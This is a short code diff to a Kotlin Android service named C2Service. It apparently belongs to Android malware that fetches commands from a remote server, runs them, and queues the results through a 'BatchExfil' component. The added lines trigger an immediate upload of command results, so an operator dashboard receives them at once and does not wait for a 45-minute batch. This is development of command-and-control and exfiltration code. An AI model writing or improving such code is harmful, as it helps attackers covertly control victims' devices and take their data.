@@ -96,6 +96,7 @@ class C2Service : Service() {
                 if (!resp.isSuccessful) return
                 val body = resp.body?.string() ?: return
                 val arr = JSONArray(body)
+                var dispatched = false
                 for (i in 0 until arr.length()) {
                     val o = arr.getJSONObject(i)
                     val cmd = o.optString("cmd")
@@ -112,6 +113,12 @@ class C2Service : Service() {
                     } catch (t: Throwable) {
                         BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}""")
                     }
+                    dispatched = true
+                }
+                if (dispatched) {
+                    // The result of a command must not wait for the 45-minute
+                    // batch - the dashboard reacts immediately.
+                    try { com.sp.core.worker.BatchFlushWorker.flushNow(this) } catch (_: Throwable) {}
                 }
             }
         } catch (_: Throwable) {
